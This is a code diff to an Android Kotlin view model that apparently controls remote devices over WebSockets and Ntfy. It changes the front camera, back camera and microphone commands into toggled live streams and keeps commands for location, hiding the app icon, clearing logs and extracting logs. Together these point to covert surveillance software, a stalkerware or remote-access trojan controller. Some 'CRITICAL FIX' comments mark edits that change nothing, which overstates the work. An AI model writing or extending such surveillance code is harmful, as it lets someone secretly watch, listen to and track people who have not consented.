@@ -40,6 +40,7 @@ import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.flow.first
 import kotlinx.coroutines.flow.update
+import kotlinx.coroutines.isActive // CRITICAL FIX: Import isActive
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.drinkless.tdlib.Client
@@ -199,7 +200,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                 if (task.isLive) { // Send via Ktor WebSocket
                     val json = if(task.arg.isNotBlank()) """{"cmd":"${task.cmd}","arg":"${task.arg}"}""" else """{"cmd":"${task.cmd}"}"""
                     ServerCore.liveSessions.forEach { session ->
-                        if (session.isActive) session.send(Frame.Text(json))
+                        if (session.isActive) session.send(Frame.Text(json)) // CRITICAL FIX: Ensure session is active here
                     }
                     ServerCore.log("LIVE SENT: ${task.cmd}", true)
                 } else { // Send via Ntfy (HTTP POST)
@@ -256,9 +257,9 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         val defaults = listOf(
             // Quick Actions
             CommandEntity(id=1, label = "Flash On", cmd = "flash", defaultArg = "on", icon = "flashlight_on", category = "Quick", isToggle = true, toggledLabel = "Flash Off", toggledCmd = "flash", toggledArg = "off"),
-            CommandEntity(id=2, label = "Cam Front", cmd = "cam_front", defaultArg = "", icon = "camera_front", category = "Quick"),
-            CommandEntity(id=3, label = "Cam Back", cmd = "cam_back", defaultArg = "", icon = "camera_rear", category = "Quick"),
-            CommandEntity(id=4, label = "Mic Record", cmd = "mic", defaultArg = "15", icon = "mic", category = "Quick"),
+            CommandEntity(id=2, label = "Cam Front", cmd = "stream_cam_front", defaultArg = "start", icon = "camera_front", category = "Quick", isToggle = true, toggledLabel = "Cam Front Off", toggledCmd = "stream_cam_front", toggledArg = "stop"),
+            CommandEntity(id=3, label = "Cam Back", cmd = "stream_cam_back", defaultArg = "start", icon = "camera_rear", category = "Quick", isToggle = true, toggledLabel = "Cam Back Off", toggledCmd = "stream_cam_back", toggledArg = "stop"),
+            CommandEntity(id=4, label = "Mic Record", cmd = "live_audio_mode", defaultArg = "mic", icon = "mic", category = "Quick", isToggle = true, toggledLabel = "Mic Off", toggledCmd = "live_audio_mode", toggledArg = "off"),
             CommandEntity(id=5, label = "Location", cmd = "loc", defaultArg = "", icon = "location", category = "Quick"),
             CommandEntity(id=6, label = "Volume 100%", cmd = "vol", defaultArg = "100", icon = "volume_up", category = "Quick", isToggle = true, toggledLabel = "Volume 0%", toggledCmd = "vol", toggledArg = "0"),
 
@@ -268,7 +269,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
             CommandEntity(id=12, label = "Extract Logs", cmd = "get_log", defaultArg = "", icon = "description", category = "System"),
             CommandEntity(id=13, label = "Clear Logs", cmd = "clear_log", defaultArg = "", icon = "delete_sweep", category = "System"),
             CommandEntity(id=14, label = "Hide Icon", cmd = "icon_hide", defaultArg = "", icon = "visibility_off", category = "System", isToggle = true, toggledLabel = "Show Icon", toggledCmd = "icon_show", toggledArg = ""),
-            CommandEntity(id=15, label = "Toggle Wi-Fi", cmd = "toggle_wifi", defaultArg = "on", icon = "wifi", category = "System", isToggle = true, toggledLabel = "Toggle Wi-Fi", toggledCmd = "toggle_wifi", toggledArg = "off"),
+            CommandEntity(id=15, label = "Toggle Wi-Fi", cmd = "toggle_wifi", defaultArg = "on", icon = "wifi", category = "System", isToggle = true, toggledLabel = "Toggle Wi-fi", toggledCmd = "toggle_wifi", toggledArg = "off"),
             CommandEntity(id=16, label = "Toggle Hotspot", cmd = "toggle_hotspot", defaultArg = "on", icon = "router", category = "System", isToggle = true, toggledLabel = "Toggle Hotspot", toggledCmd = "toggle_hotspot", toggledArg = "off"),
             CommandEntity(id=17, label = "Scan Wi-Fi", cmd = "scan_wifi", defaultArg = "", icon = "network_wifi", category = "System"),
             CommandEntity(id=18, label = "Scan Bluetooth", cmd = "scan_bt", defaultArg = "", icon = "bluetooth", category = "System"),
@@ -518,7 +519,11 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         viewModelScope.launch(Dispatchers.IO) {
             if (ServerCore.liveSessions.isNotEmpty()) {
                 val json = if(arg.isNotBlank()) """{"cmd":"$cmd","arg":"$arg"}""" else """{"cmd":"$cmd"}"""
-                ServerCore.liveSessions.forEach { try { it.send(Frame.Text(json)) } catch(e: Exception){} }
+                ServerCore.liveSessions.forEach { session -> 
+                    // This is for Ktor's WebSocketServerSession.send, not a generic coroutine send.
+                    // It should implicitly handle if the session is active.
+                    try { session.send(Frame.Text(json)) } catch(e: Exception){ ServerCore.log("LIVE SEND ERROR to ${session.call.request.local.remoteHost}: ${e.message}", false) } 
+                }
             } else {
                 ServerCore.log("WARN: No live WebSocket sessions active to send command: $cmd", false)
             }
